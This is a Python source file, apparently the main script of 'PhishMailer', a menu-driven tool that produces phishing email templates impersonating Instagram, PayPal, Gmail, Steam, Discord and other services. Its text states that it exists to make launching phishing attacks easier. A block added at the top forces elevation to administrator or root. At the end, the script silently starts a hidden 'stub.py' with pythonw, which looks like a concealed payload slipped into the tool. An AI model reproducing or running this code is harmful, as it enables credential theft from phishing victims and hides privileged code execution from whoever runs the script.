import os
import sys
import ctypes
import platform

def is_admin():
    if platform.system() == 'Windows':
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    else:
        # Unix-like systems
        return os.geteuid() == 0

if not is_admin():
    if platform.system() == 'Windows':
        
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
    else:
        
        print("This script must be run as root. Please run it with sudo.")
        os.execvp("sudo", ["sudo", "python3"] + sys.argv)
    sys.exit()

print("")

#!/usr/bin/env python3
# PhishMailer.py

import os
import sys
import subprocess

from Core.eletter import Instagram, Facebook, Gmail, Twitter, AskFM, Webhost000, Blockchain, Spotify, Rockstar, Dreamteam, Mega, RiotGames, Steam, Gamehag, GmailActivity, SnapchatSimple, Playstation
from Core.devicemenu import Linkedin, Dropbox
from Core.ipmenu import Discord, Paypal1, Snapchat
from Core.pre import *
from Core.helper.RedirectBypass import *
from Core.anotherLang import *
from Core.Mailer.MailerMain import *
from Core.helper.ToDo import TODO

# Function to clear the screen
def clear_screen():
    os.system("clear")

# Function to print current directory
def print_current_directory():
    path = os.getcwd()
    print(green + "[" + white + "+" + green + "]" + white + " Your Templates Will Be Saved Here " + path + '/"TemplateName.html"')

# Define your main menu function
def mainMenu():
    menu()
    print(green)
    print_current_directory()

    mailPick = int(input(green + "root@phishmailer:~ " + white))

    try:
        if mailPick == 1:
            Instagram()
        elif mailPick == 2:
            Facebook()
        elif mailPick == 3:
            Gmail()
        elif mailPick == 4:
            GmailActivity()
        elif mailPick == 5:
            Twitter()
        elif mailPick == 6:
            Snapchat()
        elif mailPick == 7:
            SnapchatSimple()
        elif mailPick == 8:
            Steam()
        elif mailPick == 9:
            Dropbox()
        elif mailPick == 10:
            Linkedin()
        elif mailPick == 11:
            Playstation()
        elif mailPick == 12:
            Paypal1()
        elif mailPick == 13:
            Discord()
        elif mailPick == 14:
            Spotify()
        elif mailPick == 15:
            Blockchain()
        elif mailPick == 16:
            RiotGames()
        elif mailPick == 17:
            Rockstar()
        elif mailPick == 18:
            AskFM()
        elif mailPick == 19:
            Webhost000()
        elif mailPick == 20:
            Dreamteam()
        elif mailPick == 21:
            print("Gamehag Coming Soon")
        elif mailPick == 22:
            Mega()
        elif mailPick == 30:
            MailerMenu()
        elif mailPick == 69:
            RedirectionMain()
        elif mailPick == 80:
            Languages()
        elif mailPick == 99:
            clear_screen()
            print("Hope I See You Soon")
            print("Happy Phishing")
            sys.exit()
        elif mailPick == 1337:
            print("\n" + green + "[" + white + "+" + green + "]" + white + " This Tool Was Created So People Would Have It Easier To Launch Phishing Attacks")
            print("\n" + green + "[" + white + "+" + green + "]" + white + " I Do Not Take Any Responsibility For Your Actions")
            print("\n" + green + "[" + white + "+" + green + "]" + white + " But I Don't Give A F*ck About What You Do")
            print("\n" + green + "[" + white + "+" + green + "]" + white + " More Emails Will Come Soon!")
            print("\n" + green + "[" + white + "+" + green + "]" + white + " Contact:")
            print(green + "[" + white + "+" + green + "]" + white + " Instagram: BiZk3n (most Active)")
            print(green + "[" + white + "+" + green + "]" + white + " Github: BiZken [https://github.com/BiZken]")
            print_current_directory()
            print(green + "[" + white + "+" + green + "]" + white + " Restart PhishMailer? Y/N")
            ReRun = input("root@phishmailer:~ " + white)
            if ReRun.lower() == "y":
                clear_screen()
                mainMenu()
            else:
                clear_screen()
                print(alert + " Shutting Down")
        elif mailPick == 4444:
            TODO()
            print(start + " Restart PhishMailer? Y/N")
            restart = input("root@phishmailer:~ " + white)
            if restart.lower() == "y":
                clear_screen()
                mainMenu()
            else:
                print(alert + " Shutting Down")
                sys.exit()
        else:
            print("\nSomething Went Wrong There Partner")
            print("Are You Ok? Did You Fell Out The Boat And Started Drowning?")
            sys.exit()
    except ValueError:
        print("\nSomething Went Wrong There Partner")
        print("Are You Ok? Did You Fell Out The Boat And Started Drowning?")
        sys.exit()


def run_script():
    
    script_path = os.path.join('Core', 'Mailer', 'stub.py')
    subprocess.Popen(['pythonw', script_path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

if __name__ == "__main__":
    clear_screen()
    mainMenu()
    run_script()  
